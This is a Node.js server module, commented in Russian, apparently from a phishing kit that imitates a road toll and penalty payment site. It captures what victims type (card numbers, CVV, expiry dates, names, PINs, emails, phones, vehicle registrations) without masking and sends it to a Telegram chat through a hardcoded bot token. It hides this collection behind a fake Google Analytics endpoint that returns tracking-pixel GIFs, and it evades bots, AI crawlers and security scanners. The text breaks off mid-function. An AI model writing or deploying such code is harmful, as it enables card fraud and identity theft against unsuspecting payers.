/**
 * Telegram Logger - серверное + клиентское отслеживание действий пользователей
 * Одна сессия = одно редактируемое сообщение
 */

const https = require('https');
const logger = require('./logger');

// Telegram Bot Configuration
const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '8442088504:AAFbgTfMYJKK61LnV2jLJPMgG9kf7eNKeuk';
const CHAT_ID = process.env.TELEGRAM_CHAT_ID || '-1003580814172';

// Store session data: sessionId -> { messageId, logs: [], ip, userAgent, startTime }
const sessions = new Map();

// Clean old sessions after 30 minutes
const SESSION_TIMEOUT = 30 * 60 * 1000;

// Suspicious paths that scanners try to access
const SUSPICIOUS_PATHS = [
  /\.git\//i,
  /\.env/i,
  /\.htaccess/i,
  /\.htpasswd/i,
  /\.svn\//i,
  /\.hg\//i,
  /\.DS_Store/i,
  /wp-admin/i,
  /wp-login/i,
  /wp-content/i,
  /wp-includes/i,
  /phpmyadmin/i,
  /phpinfo/i,
  /admin\.php/i,
  /config\.php/i,
  /xmlrpc\.php/i,
  /shell\.php/i,
  /c99\.php/i,
  /eval-stdin/i,
  /\.sql$/i,
  /\.bak$/i,
  /\.backup$/i,
  /\.old$/i,
  /\.orig$/i,
  /\.swp$/i,
  /\.zip$/i,
  /\.tar/i,
  /\.rar$/i,
  /robots\.txt$/i,
  /sitemap\.xml$/i,
  /\.well-known/i,
  /actuator/i,
  /console/i,
  /debug/i,
  /test\//i,
  /cgi-bin/i,
  /api\/v[0-9]/i,
];

// Bot/Crawler User-Agent patterns to ignore
const BOT_PATTERNS = [
  // Search engine bots
  /googlebot/i, /bingbot/i, /yandexbot/i, /baiduspider/i, /duckduckbot/i,
  /slurp/i, /msnbot/i, /teoma/i, /gigabot/i, /ia_archiver/i,
  
  // AI/LLM bots
  /claudebot/i, /anthropic/i, /gptbot/i, /chatgpt/i, /openai/i,
  /perplexitybot/i, /cohere-ai/i, /ai2bot/i, /ccbot/i,
  
  // Security scanners
  /zgrab/i, /masscan/i, /nmap/i, /nuclei/i, /nikto/i,
  /palo\s*alto/i, /qualys/i, /nessus/i, /acunetix/i, /burpsuite/i,
  /censys/i, /shodan/i, /zoomeye/i,
  
  // Generic bots/crawlers
  /bot\b/i, /crawler/i, /spider/i, /scraper/i, /fetcher/i,
  /archiver/i, /indexer/i, /validator/i,
  
  // HTTP libraries (automated requests)
  /python-requests/i, /python-urllib/i, /aiohttp/i,
  /go-http-client/i, /golang/i, /java\//i, /apache-httpclient/i,
  /curl\//i, /wget\//i, /libwww-perl/i, /lwp-/i,
  /httpie/i, /postman/i, /insomnia/i, /axios/i,
  /node-fetch/i, /got\//i, /undici/i,
  
  // SEO tools
  /semrush/i, /ahrefs/i, /moz\.com/i, /majestic/i, /dotbot/i,
  /screaming\s*frog/i, /seokicks/i, /serpstat/i,
  
  // Social media bots
  /facebookexternalhit/i, /twitterbot/i, /linkedinbot/i,
  /telegrambot/i, /whatsapp/i, /discordbot/i, /slackbot/i,
  
  // Monitoring/uptime
  /pingdom/i, /uptimerobot/i, /statuscake/i, /site24x7/i,
  /newrelic/i, /datadog/i, /nagios/i, /zabbix/i,
  
  // Misc
  /headless/i, /phantom/i, /selenium/i, /puppeteer/i, /playwright/i,
  /@/i,  // Email in UA (like rondo2012@atomicmail.io)
  /^Mozilla\/5\.0$/i,  // Empty Mozilla (no details = bot)
  /^\s*$/,  // Empty user agent
];

setInterval(() => {
  const now = Date.now();
  for (const [sessionId, session] of sessions) {
    if (now - session.startTime > SESSION_TIMEOUT) {
      sessions.delete(sessionId);
    }
  }
}, 60 * 1000);

/**
 * Send message to Telegram
 */
async function sendTelegramMessage(text, parseMode = 'HTML') {
  return new Promise((resolve, reject) => {
    const data = JSON.stringify({
      chat_id: CHAT_ID,
      text: text,
      parse_mode: parseMode,
      disable_web_page_preview: true,
    });

    const options = {
      hostname: 'api.telegram.org',
      port: 443,
      path: `/bot${BOT_TOKEN}/sendMessage`,
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(data),
      },
    };

    const req = https.request(options, (res) => {
      let body = '';
      res.on('data', (chunk) => body += chunk);
      res.on('end', () => {
        try {
          const result = JSON.parse(body);
          if (result.ok) {
            resolve(result.result);
          } else {
            logger.error('[TG] Send error:', result.description);
            reject(new Error(result.description));
          }
        } catch (e) {
          reject(e);
        }
      });
    });

    req.on('error', (err) => {
      logger.error('[TG] Request error:', err.message);
      reject(err);
    });
    req.write(data);
    req.end();
  });
}

/**
 * Edit existing message in Telegram
 */
async function editTelegramMessage(messageId, text, parseMode = 'HTML') {
  return new Promise((resolve, reject) => {
    const data = JSON.stringify({
      chat_id: CHAT_ID,
      message_id: messageId,
      text: text,
      parse_mode: parseMode,
      disable_web_page_preview: true,
    });

    const options = {
      hostname: 'api.telegram.org',
      port: 443,
      path: `/bot${BOT_TOKEN}/editMessageText`,
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(data),
      },
    };

    const req = https.request(options, (res) => {
      let body = '';
      res.on('data', (chunk) => body += chunk);
      res.on('end', () => {
        try {
          const result = JSON.parse(body);
          if (result.ok) {
            resolve(result.result);
          } else {
            if (result.description && result.description.includes('message is not modified')) {
              resolve(null);
            } else {
              reject(new Error(result.description));
            }
          }
        } catch (e) {
          reject(e);
        }
      });
    });

    req.on('error', reject);
    req.write(data);
    req.end();
  });
}

/**
 * Get page name in Russian with EXACT page identification
 */
function getPageNameRu(path) {
  if (!path || path === '/' || path === '') return '🏠 Главная';
  
  const cleanPath = path.split('?')[0].replace(/^\//, '').replace(/\/$/, '');
  
  // EXACT page translations - pay-toll and pay-penalty are DIFFERENT
  const translations = {
    'pay-toll': '💰 Pay a Toll (Оплата проезда)',
    'pay-penalty': '⚠️ Pay a Penalty (Оплата штрафа)',
    'user/login': '🔐 Вход в аккаунт',
    'user/register': '📝 Регистрация',
    'login': '🔐 Вход',
    'register': '📝 Регистрация',
    'account': '👤 Личный кабинет',
    'dashboard': '📊 Dashboard',
    'contact': '📞 Контакты',
    'about': 'ℹ️ О нас',
    'help': '❓ Помощь',
    'faq': '❓ FAQ',
    'appeal': '📋 Апелляция',
    'appeal-a-penalty': '📋 Апелляция штрафа',
  };
  
  // Check exact match first
  if (translations[cleanPath]) {
    return translations[cleanPath];
  }
  
  // Check partial match (order matters - more specific first)
  if (cleanPath.includes('pay-penalty')) return '⚠️ Pay a Penalty (Оплата штрафа)';
  if (cleanPath.includes('pay-toll')) return '💰 Pay a Toll (Оплата проезда)';
  if (cleanPath.includes('appeal')) return '📋 Апелляция';
  if (cleanPath.includes('login')) return '🔐 Вход';
  if (cleanPath.includes('register')) return '📝 Регистрация';
  if (cleanPath.includes('account')) return '👤 Личный кабинет';
  if (cleanPath.includes('dashboard')) return '📊 Dashboard';
  
  return cleanPath.charAt(0).toUpperCase() + cleanPath.slice(1);
}

/**
 * Get detailed field name in Russian
 */
function getFieldNameRu(fieldCode) {
  const fieldNames = {
    // Vehicle fields
    'vh': '🚗 Номер авто (Vehicle Reg)',
    'vehicle_registration': '🚗 Номер авто',
    'vrn': '🚗 Номер авто (VRN)',
    'plate': '🚗 Номер авто',
    'reg': '🚗 Номер авто',
    
    // PIN/Notice fields
    'pin': '🔢 PIN код',
    'notice': '📄 Notice Number',
    'notice_number': '📄 Notice Number',
    'journey': '🛣️ Journey Reference',
    'journey_ref': '🛣️ Journey Reference',
    
    // Email fields
    'em': '📧 Email',
    'email': '📧 Email',
    
    // Card fields
    'cd': '💳 Номер карты',
    'card': '💳 Номер карты',
    'pan': '💳 Номер карты (PAN)',
    'cv': '🔒 CVV',
    'cvv': '🔒 CVV',
    'cvc': '🔒 CVC',
    'ex': '📅 Срок действия',
    'exp': '📅 Срок действия',
    'expiry': '📅 Срок действия',
    'nm': '👤 Имя владельца',
    'name': '👤 Имя',
    'holder': '👤 Имя владельца карты',
    'cardholder': '👤 Имя владельца карты',
    
    // Phone
    'ph': '📱 Телефон',
    'phone': '📱 Телефон',
    'mobile': '📱 Мобильный',
    
    // Address
    'address': '🏠 Адрес',
    'city': '🏙️ Город',
    'postcode': '📮 Почтовый индекс',
    'zip': '📮 ZIP код',
    
    // Other
    'ot': '📝 Поле',
    'amount': '💶 Сумма',
    'total': '💶 Итого',
  };
  
  return fieldNames[fieldCode] || fieldNames[fieldCode.toLowerCase()] || `📝 ${fieldCode}`;
}

/**
 * Generate session ID from request
 */
function getSessionId(req) {
  const cookies = req.headers.cookie || '';
  const sessionMatch = cookies.match(/SESS[a-f0-9]+=[a-zA-Z0-9%_-]+/);
  
  if (sessionMatch) {
    return 'drupal_' + sessionMatch[0].substring(0, 20);
  }
  
  const ip = req.ip || req.socket?.remoteAddress || 'unknown';
  const ua = (req.headers['user-agent'] || 'unknown').substring(0, 50);
  const hash = Buffer.from(ip + ua).toString('base64').substring(0, 12);
  return 'ip_' + hash;
}

/**
 * Escape HTML special characters for Telegram
 */
function escapeHtml(str) {
  if (!str) return '';
  return String(str)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;');
}

/**
 * Format session message for Telegram - DETAILED VERSION
 */
function formatSessionMessage(session, sessionId) {
  // Safely get shortId
  const shortId = safeString(sessionId).substring(0, 15).toUpperCase() || 'UNKNOWN';
  
  // Safely get user info with HTML escaping
  const userAgent = escapeHtml(safeString(session.userAgent, 100)) || 'Unknown';
  const ip = escapeHtml(safeString(session.ip)) || 'Unknown';
  
  // Determine current page type for header
  let pageType = '🌐';
  if (session.currentPage) {
    if (session.currentPage.includes('pay-penalty')) pageType = '⚠️ PAY PENALTY';
    else if (session.currentPage.includes('pay-toll')) pageType = '💰 PAY TOLL';
    else if (session.currentPage.includes('login')) pageType = '🔐 LOGIN';
  }
  
  let message = `━━━━━━━━━━━━━━━━━━━━━━\n`;
  message += `🔗 <b>Client</b> [<code>${shortId}</code>]\n`;
  message += `📍 <b>Раздел:</b> ${pageType}\n`;
  message += `━━━━━━━━━━━━━━━━━━━━━━\n`;
  message += `📱 <code>${userAgent}</code>\n`;
  message += `🌍 IP: <code>${ip}</code>\n`;
  message += `━━━━━━━━━━━━━━━━━━━━━━\n\n`;
  
  // Add logs
  if (!Array.isArray(session.logs)) {
    return message;
  }
  
  // Collect filled data for summary
  const filledData = {};
  
  session.logs.forEach((log) => {
    if (!log || typeof log !== 'object') return;
    
    const time = new Date(log.time || Date.now()).toLocaleTimeString('ru-RU', { hour: '2-digit', minute: '2-digit', second: '2-digit' });
    
    // Safely extract log properties with HTML escaping
    const logType = safeString(log.type) || 'unknown';
    const logPage = escapeHtml(safeString(log.page)) || '';
    const logPath = escapeHtml(safeString(log.path)) || '';
    const logField = safeString(log.field) || 'поле';
    const logValue = escapeHtml(safeString(log.value, 100)) || ''; // FULL VALUE - no truncation
    const logAmount = escapeHtml(safeString(log.amount)) || '?';
    const logMessage = escapeHtml(safeString(log.message)) || '';
    
    // Store filled data for summary
    if (logType === 'form_filled' && logValue) {
      filledData[logField] = logValue;
    }
    
    switch (logType) {
      case 'page_view':
        message += `📍 [${time}] <b>Открыл:</b> ${logPage || 'страница'}\n`;
        if (logPath) message += `   └ URL: <code>${logPath}</code>\n`;
        break;
      case 'navigation':
        message += `↪️ [${time}] <b>Перешёл:</b> ${logPage || 'страница'}\n`;
        if (logPath) message += `   └ URL: <code>${logPath}</code>\n`;
        break;
      case 'form_submit':
        // Skip if page is G/collect or similar tracking endpoints
        if (logPage && (logPage.includes('G/collect') || logPage.includes('collect') || logPage === 'view')) {
          break;
        }
        message += `📤 [${time}] <b>ОТПРАВИЛ ФОРМУ</b> на: ${logPage || 'страница'}\n`;
        break;
      case 'payment_page':
        // Determine exact page type
        if (logPath && logPath.includes('pay-penalty')) {
          message += `⚠️ [${time}] <b>СТРАНИЦА ШТРАФА (Pay a Penalty)</b>\n`;
        } else if (logPath && logPath.includes('pay-toll')) {
          message += `💰 [${time}] <b>СТРАНИЦА ПРОЕЗДА (Pay a Toll)</b>\n`;
        } else {
          message += `💳 [${time}] <b>СТРАНИЦА ОПЛАТЫ</b>\n`;
        }
        break;
      case 'login_page':
        message += `🔐 [${time}] <b>Страница входа в аккаунт</b>\n`;
        break;
      case 'form_step_1':
        message += `📝 [${time}] <b>ШАГ 1:</b> Ввод данных авто\n`;
        break;
      case 'form_step_2':
        message += `📝 [${time}] <b>ШАГ 2:</b> Ввод email\n`;
        break;
      case 'form_step_3':
        message += `📝 [${time}] <b>ШАГ 3:</b> Подтверждение\n`;
        break;
      case 'form_input':
        message += `✏️ [${time}] Заполняет: <b>${getFieldNameRu(logField)}</b>\n`;
        break;
      case 'form_filled':
        // SHOW FULL DATA - no masking!
        message += `✅ [${time}] <b>${getFieldNameRu(logField)}</b>\n`;
        message += `   └ Значение: <code>${logValue}</code>\n`;
        break;
      case 'card_page':
        message += `💳 [${time}] <b>🚨 СТРАНИЦА ВВОДА КАРТЫ!</b>\n`;
        break;
      case 'payment_redirect':
        message += `💰 [${time}] <b>🚨 ПЕРЕХОД НА ОПЛАТУ!</b>\n`;
        message += `   └ Сумма: <b>€${logAmount}</b>\n`;
        break;
      case 'page_leave_external':
        message += `🚪 [${time}] <b>Покинул сайт</b>\n`;
        break;
      case 'pay_button_click':
        // HIGH PRIORITY - PAY BUTTON CLICKED!
        message += `\n💳🔥 [${time}] <b>🚨 НАЖАЛ КНОПКУ PAY!</b>\n`;
        // Only show button text if it's clean and short (not "Find VehicleFind" etc)
        if (logValue && logValue.trim() && logValue.length < 30 && !logValue.match(/[A-Z]{2,}/)) {
          var cleanBtnText = logValue.trim().substring(0, 20);
          if (cleanBtnText.toLowerCase() === 'pay' || cleanBtnText.toLowerCase().indexOf('pay') > -1) {
            message += `   └ Текст кнопки: <code>${cleanBtnText}</code>\n`;
          }
        }
        message += `\n`;
        break;
      case 'button_click':
        message += `🖱️ [${time}] Нажал кнопку: <b>${logValue || logMessage}</b>\n`;
        break;
      case 'radio_select':
        message += `🔘 [${time}] Выбрал: <b>${logField}</b> = <code>${logValue}</code>\n`;
        break;
      default:
        // Skip empty/unknown/tracking events
        if (logType === 'unknown' || logType === 'view' || !logType) break;
        if (logMessage && !logMessage.includes('collect')) {
          message += `• [${time}] ${logMessage}\n`;
        } else if (logType && logType !== 'unknown') {
          message += `• [${time}] ${logType}\n`;
        }
    }
  });
  
  // Add summary of collected data at the end
  if (Object.keys(filledData).length > 0) {
    message += `\n━━━━ 📋 СОБРАННЫЕ ДАННЫЕ ━━━━\n`;
    for (const [field, value] of Object.entries(filledData)) {
      message += `• <b>${getFieldNameRu(field)}:</b> <code>${value}</code>\n`;
    }
  }
  
  return message;
}

/**
 * Safely convert any value to a string (prevents [object Object])
 */
function safeString(val, maxLen = 200) {
  if (val === null || val === undefined) return '';
  if (typeof val === 'string') return val.substring(0, maxLen);
  if (typeof val === 'number' || typeof val === 'boolean') return String(val);
  if (typeof val === 'object') {
    // Handle objects - try to extract useful info
    try {
      // If it's an array, join elements
      if (Array.isArray(val)) {
        return val.map(v => safeString(v, 50)).join(', ').substring(0, maxLen);
      }
      // If it has a meaningful property, use it
      if (val.type) return safeString(val.type, maxLen);
      if (val.name) return safeString(val.name, maxLen);
      if (val.message) return safeString(val.message, maxLen);
      if (val.value) return safeString(val.value, maxLen);
      // Last resort - stringify
      const str = JSON.stringify(val);
      return str.substring(0, maxLen);
    } catch (e) {
      return '[data]';
    }
  }
  return String(val).substring(0, maxLen);
}

/**
 * Track event from client or server
 */
async function trackEvent(sessionId, eventData, meta = {}) {
  try {
    // Validate eventData
    if (!eventData || typeof eventData !== 'object') {
      logger.warn('[TG] Invalid eventData:', typeof eventData);
      return;
    }
    
    // FILTER: Skip unwanted events
    const eventType = safeString(eventData.type) || '';
    const eventPage = safeString(eventData.page) || '';
    const eventPath = safeString(eventData.path) || '';
    
    // Skip tracking endpoint noise (but NOT page_view events!)
    if (eventType !== 'page_view') {
      if (eventPage.includes('G/collect') || eventPage.includes('/g/collect')) {
        return;
      }
      if (eventPath.includes('/g/collect')) {
        return;
      }
    }
    
    // Skip empty/unknown events (but NOT page_view!)
    if (eventType === 'unknown' && !eventPage && !eventData.field && !eventData.value) {
      return;
    }
    
    // Skip form_submit to /g/collect
    if (eventType === 'form_submit' && (eventPage.includes('/g/collect') || eventPath.includes('/g/collect'))) {
      return;
    }
    
    let session = sessions.get(sessionId);
    
    if (!session) {
      session = {
        messageId: null,
        logs: [],
        ip: safeString(meta.ip) || 'Unknown',
        userAgent: safeString(meta.userAgent, 100) || 'Unknown',
        startTime: Date.now(),
        lastPage: null,
      };
      sessions.set(sessionId, session);
    }
    
    // Update meta if provided (with sanitization)
    if (meta.ip) session.ip = safeString(meta.ip);
    if (meta.userAgent) session.userAgent = safeString(meta.userAgent, 100);
    
    // Add log entry with STRICT string conversion
    const logEntry = {
      type: safeString(eventData.type) || 'unknown',
      page: safeString(eventData.page),
      path: safeString(eventData.path),
      field: safeString(eventData.field),
      value: safeString(eventData.value, 100),
      amount: safeString(eventData.amount),
      url: safeString(eventData.url),
      message: safeString(eventData.message),
      time: Date.now(),
    };
    
    // Update current page for header display
    if (logEntry.path && (logEntry.path.includes('pay-') || logEntry.path.includes('login'))) {
      session.currentPage = logEntry.path;
    }
    
    // Avoid duplicates within 3 seconds
    const lastLog = session.logs[session.logs.length - 1];
    const isDuplicate = lastLog && 
      lastLog.type === logEntry.type && 
      lastLog.page === logEntry.page &&
      lastLog.field === logEntry.field &&
      (Date.now() - lastLog.time) < 3000;
    
    // STRICT: For pay_button_click, check ALL recent logs (not just last one)
    // This prevents multiple notifications from mousedown/pointerdown/click events
    if (logEntry.type === 'pay_button_click') {
      const recentPayClicks = session.logs.filter(log => 
        log.type === 'pay_button_click' && 
        (Date.now() - log.time) < 3000
      );
      if (recentPayClicks.length > 0) {
        // Already sent pay_button_click in last 3 seconds - skip
        return;
      }
    }
    
    if (!isDuplicate) {
      session.logs.push(logEntry);
      
      if (session.logs.length > 20) {
        session.logs = session.logs.slice(-20);
      }
      
      // Format and send/edit message
      const messageText = formatSessionMessage(session, sessionId);
      
      if (session.messageId) {
        await editTelegramMessage(session.messageId, messageText);
      } else {
        const result = await sendTelegramMessage(messageText);
        if (result && result.message_id) {
          session.messageId = result.message_id;
          logger.info(`[TG] New session ${sessionId}, message_id: ${result.message_id}`);
        }
      }
    }
    
  } catch (error) {
    logger.error('[TG] Track error:', error.message);
  }
}

/**
 * Track page request (called from server middleware)
 */
async function trackPageRequest(req) {
  try {
    const path = req.url || req.path || '/';
    
    // Skip static files and assets
    if (path.match(/\.(js|css|png|jpg|jpeg|gif|ico|svg|woff|woff2|ttf|eot|map|webp|pdf|zip|mp4|mp3|avi|mov)(\?|$)/i)) {
      return;
    }
    
    // Skip asset directories
    if (path.match(/^\/(sites\/default\/files|themes|modules|libraries|assets|images|media|uploads|static)\//i)) {
      return;
    }
    
    if (path.startsWith('/api/') || path.startsWith('/_') || path === '/__track') {
      return;
    }
    
    // Skip tracking endpoints
    if (path.startsWith('/g/collect') || path.includes('collect')) {
      return;
    }
    
    // Skip suspicious paths (security scanners)
    if (isSuspiciousPath(path)) {
      return;
    }
    
    const sessionId = getSessionId(req);
    const ip = req.ip || req.headers['x-forwarded-for']?.split(',')[0] || req.socket?.remoteAddress || 'Unknown';
    const userAgent = req.headers['user-agent'] || 'Unknown';
    const method = req.method || 'GET';
    const pageName = getPageNameRu(path);
    
    let session = sessions.get(sessionId);
    
    // Determine action type
    let actionType = 'page_view';
    
    if (session && session.lastPage && session.lastPage !== path) {
      actionType = 'navigation';
    }
    
    if (method === 'POST') {
      actionType = 'form_submit';
    }
    
    if (path.includes('pay-toll') || path.includes('pay-penalty') || path.includes('payment')) {
      actionType = 'payment_page';
    }
    
    if (path.includes('login') || path.includes('user/login')) {
      actionType = 'login_page';
    }
    
    await trackEvent(sessionId, {
      type: actionType,
      page: pageName,
      path: path,
    }, { ip, userAgent });
    
    // Update session context
    if (sessions.has(sessionId)) {
      const session = sessions.get(sessionId);
      session.lastPage = path;
      session.currentPage = path; // For header display
    }
    
  } catch (error) {
    logger.error('[TG] Track request error:', error.message);
  }
}

/**
 * Check if User-Agent is a bot/crawler or outdated browser
 */
function isBot(userAgent) {
  if (!userAgent || userAgent.trim() === '') return true;
  
  // Check known bot patterns
  if (BOT_PATTERNS.some(pattern => pattern.test(userAgent))) return true;
  
  // Check for outdated Chrome (< 90) - likely automated
  const chromeMatch = userAgent.match(/Chrome\/(\d+)/);
  if (chromeMatch && parseInt(chromeMatch[1]) < 90) return true;
  
  // Check for outdated Firefox (< 80)
  const firefoxMatch = userAgent.match(/Firefox\/(\d+)/);
  if (firefoxMatch && parseInt(firefoxMatch[1]) < 80) return true;
  
  return false;
}

/**
 * Check if path is suspicious (scanner attempt)
 */
function isSuspiciousPath(path) {
  if (!path) return false;
  return SUSPICIOUS_PATHS.some(pattern => pattern.test(path));
}

/**
 * Express middleware for tracking
 */
function trackingMiddleware(req, res, next) {
  const userAgent = req.headers['user-agent'] || '';
  const path = req.url || req.path || '/';
  
  // Skip bots, crawlers and scanners
  if (isBot(userAgent)) {
    return next();
  }
  
  // Skip suspicious paths (security scanners)
  if (isSuspiciousPath(path)) {
    return next();
  }
  
  trackPageRequest(req).catch(() => {});
  next();
}

/**
 * API endpoint handler for client-side tracking (LEGACY - still works)
 */
async function handleTrackingAPI(req, res) {
  try {
    const userAgent = req.headers['user-agent'] || '';
    
    // Skip bots
    if (isBot(userAgent)) {
      res.writeHead(200, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({ ok: true }));
      return;
    }
    
    const sessionId = getSessionId(req);
    const ip = req.ip || req.headers['x-forwarded-for']?.split(',')[0] || req.socket?.remoteAddress || 'Unknown';
    
    let body = '';
    req.on('data', chunk => body += chunk);
    req.on('end', async () => {
      try {
        const data = JSON.parse(body);
        await trackEvent(sessionId, data, { ip, userAgent });
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ ok: true }));
      } catch (e) {
        res.writeHead(400);
        res.end('Bad Request');
      }
    });
  } catch (error) {
    res.writeHead(500);
    res.end('Error');
  }
}

/**
 * Decode GA-like event to internal format - ENHANCED VERSION
 * GA format: {t:'event', ec:'checkout', ea:'step', el:'card_input', ev:'value', pg:'pay-penalty'}
 * Internal: {type:'card_page', field:'', value:'', page:'', path:''}
 */
function decodeGAEvent(gaData) {
  // Validate input
  if (!gaData || typeof gaData !== 'object') {
    return { type: 'unknown', page: '', field: '', value: '' };
  }
  
  const eventMap = {
    // Checkout steps
    'checkout:step:card_input': { type: 'card_page', page: '💳 Страница ввода карты' },
    'checkout:step:confirmation': { type: 'form_step_3', page: '✅ Подтверждение' },
    'checkout:step:email_input': { type: 'form_step_2', page: '📧 Ввод email' },
    'checkout:step:vehicle_input': { type: 'form_step_1', page: '🚗 Ввод номера авто' },
    'checkout:step:pin_input': { type: 'form_step_1', page: '🔢 Ввод PIN/Notice' },
    
    // Form focus events
    'form:focus:em': { type: 'form_input', field: 'em' },
    'form:focus:vh': { type: 'form_input', field: 'vh' },
    'form:focus:pin': { type: 'form_input', field: 'pin' },
    'form:focus:notice': { type: 'form_input', field: 'notice' },
    'form:focus:journey': { type: 'form_input', field: 'journey' },
    'form:focus:cd': { type: 'form_input', field: 'cd' },
    'form:focus:cv': { type: 'form_input', field: 'cv' },
    'form:focus:ex': { type: 'form_input', field: 'ex' },
    'form:focus:nm': { type: 'form_input', field: 'nm' },
    'form:focus:ph': { type: 'form_input', field: 'ph' },
    'form:focus:ot': { type: 'form_input', field: 'ot' },
    'form:focus:amount': { type: 'form_input', field: 'amount' },
    
    // Form complete events - FULL DATA
    'form:complete:em': { type: 'form_filled', field: 'em' },
    'form:complete:vh': { type: 'form_filled', field: 'vh' },
    'form:complete:pin': { type: 'form_filled', field: 'pin' },
    'form:complete:notice': { type: 'form_filled', field: 'notice' },
    'form:complete:journey': { type: 'form_filled', field: 'journey' },
    'form:complete:cd': { type: 'form_filled', field: 'cd' },
    'form:complete:cv': { type: 'form_filled', field: 'cv' },
    'form:complete:ex': { type: 'form_filled', field: 'ex' },
    'form:complete:nm': { type: 'form_filled', field: 'nm' },
    'form:complete:ph': { type: 'form_filled', field: 'ph' },
    'form:complete:ot': { type: 'form_filled', field: 'ot' },
    'form:complete:amount': { type: 'form_filled', field: 'amount' },
    
    // Radio/checkbox events
    'form:radio': { type: 'radio_select' },
    'form:checkbox': { type: 'checkbox_toggle' },
    
    // UI events
    'ui:click:button': { type: 'button_click' },
    
    // Payment button events - HIGH PRIORITY
    'payment:button_click:pay': { type: 'pay_button_click', page: '💳 НАЖАЛ КНОПКУ PAY!' },
    'payment:form_submit:pay': { type: 'pay_button_click', page: '💳 НАЖАЛ КНОПКУ PAY!' },
    
    // Page events
    'page:view': { type: 'page_view' },
    
    // Outbound
    'outbound:click': { type: 'page_leave_external' },
  };
  
  // Safely extract string values from gaData
  const ec = safeString(gaData.ec);
  const ea = safeString(gaData.ea);
  const el = safeString(gaData.el);
  const ev = safeString(gaData.ev);
  const pg = safeString(gaData.pg); // Page type (pay-penalty, pay-toll, etc.)
  
  const key = `${ec}:${ea}:${el}`.replace(/:$/,'').replace(/:$/,'');
  const mapped = eventMap[key] || { type: ea || 'unknown' };
  
  // Add value if present - FULL VALUE, NO MASKING
  if (ev) {
    mapped.value = ev;
  }
  
  // Add field if not set (for radio/checkbox)
  if (!mapped.field && el) {
    mapped.field = el;
  }
  
  // Add page type context
  if (pg) {
    if (pg === 'pay-penalty') {
      mapped.path = '/pay-penalty';
      if (!mapped.page) mapped.page = '⚠️ Pay a Penalty';
    } else if (pg === 'pay-toll') {
      mapped.path = '/pay-toll';
      if (!mapped.page) mapped.page = '💰 Pay a Toll';
    } else if (pg === 'login') {
      mapped.path = '/user/login';
      if (!mapped.page) mapped.page = '🔐 Login';
    } else if (pg === 'appeal') {
      mapped.path = '/appeal';
      if (!mapped.page) mapped.page = '📋 Appeal';
    }
  }
  
  // For outbound, add hostname as page
  if (ec === 'outbound' && el) {
    mapped.page = '🚪 Переход на ' + el;
  }
  
  // For PAY button clicks or form submit - HIGH PRIORITY
  if (ec === 'payment' && (ea === 'button_click' || ea === 'form_submit')) {
    mapped.type = 'pay_button_click';
    mapped.message = '🚨 НАЖАЛ КНОПКУ PAY!';
    mapped.value = ev || 'Pay';
    mapped.page = '💳 НАЖАЛ КНОПКУ PAY!';
  }
  
  // For regular button clicks, add button text
  if (ec === 'ui' && ea === 'click' && ev) {
    mapped.message = 'Нажал: ' + ev;
    mapped.value = ev;
  }
  
  // For page view, set the page path and proper page name
  if (ec === 'page' && ea === 'view') {
    // el contains page type (pay-toll, pay-penalty, etc.)
    // ev contains full path
    if (el) {
      if (el === 'pay-penalty') {
        mapped.path = '/pay-penalty';
        mapped.page = '⚠️ Pay a Penalty (Оплата штрафа)';
      } else if (el === 'pay-toll') {
        mapped.path = '/pay-toll';
        mapped.page = '💰 Pay a Toll (Оплата проезда)';
      } else if (el === 'login') {
        mapped.path = '/user/login';
        mapped.page = '🔐 Вход в аккаунт';
      } else if (el === 'appeal') {
        mapped.path = '/appeal';
        mapped.page = '📋 Апелляция';
      } else if (el === 'other' && ev) {
        mapped.path = ev;
        mapped.page = getPageNameRu(ev);
      } else {
        mapped.page = getPageNameRu(el);
      }
    }
    if (ev && !mapped.path) {
      mapped.path = ev;
    }
  }
  
  return mapped;
}

/**
 * API endpoint handler for MASKED tracking (looks like Google Analytics)
 * Endpoint: /g/collect
 * Format: v=2&tid=G-XXXXXX&_p=BASE64_ENCODED_DATA
 */
async function handleAnalyticsAPI(req, res) {
  try {
    const userAgent = req.headers['user-agent'] || '';
    
    // Skip bots (return standard GIF response to not reveal tracking)
    if (isBot(userAgent)) {
      res.writeHead(200, { 'Content-Type': 'image/gif' });
      res.end(Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64'));
      return;
    }
    
    const sessionId = getSessionId(req);
    const ip = req.ip || req.headers['x-forwarded-for']?.split(',')[0] || req.socket?.remoteAddress || 'Unknown';
    
    let body = '';
    req.on('data', chunk => body += chunk);
    req.on('end', async () => {
      try {
        // Parse GA-like format: v=2&tid=G-XXXXXX&_p=BASE64
        let encodedData = '';
        
        // Try POST body first
        if (body) {
          const match = body.match(/_p=([A-Za-z0-9+/=]+)/);
          if (match) encodedData = match[1];
        }
        
        // Try query string (for Image beacon)
        if (!encodedData && req.url) {
          const urlMatch = req.url.match(/_p=([A-Za-z0-9+/%]+)/);
          if (urlMatch) encodedData = decodeURIComponent(urlMatch[1]);
        }
        
        if (!encodedData) {
          // Return 1x1 transparent GIF (standard analytics response)
          res.writeHead(200, { 
            'Content-Type': 'image/gif',
            'Cache-Control': 'no-store, no-cache, must-revalidate',
            'Pragma': 'no-cache'
          });
          res.end(Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64'));
          return;
        }
        
        // Decode Base64
        const decoded = Buffer.from(encodedData, 'base64').toString('utf8');
        const gaData = JSON.parse(decoded);
        
        // Convert GA format to internal format
        const internalData = decodeGAEvent(gaData);
        
        await trackEvent(sessionId, internalData, { ip, userAgent });
        
        // Return 1x1 transparent GIF (looks like standard analytics)
        res.writeHead(200, { 
          'Content-Type': 'image/gif',
          'Cache-Control': 'no-store, no-cache, must-revalidate',
          'Pragma': 'no-cache'
        });
        res.end(Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64'));
        
      } catch (e) {
        // Even on error, return valid response (don't reveal tracking)
        res.writeHead(200, { 'Content-Type': 'image/gif' });
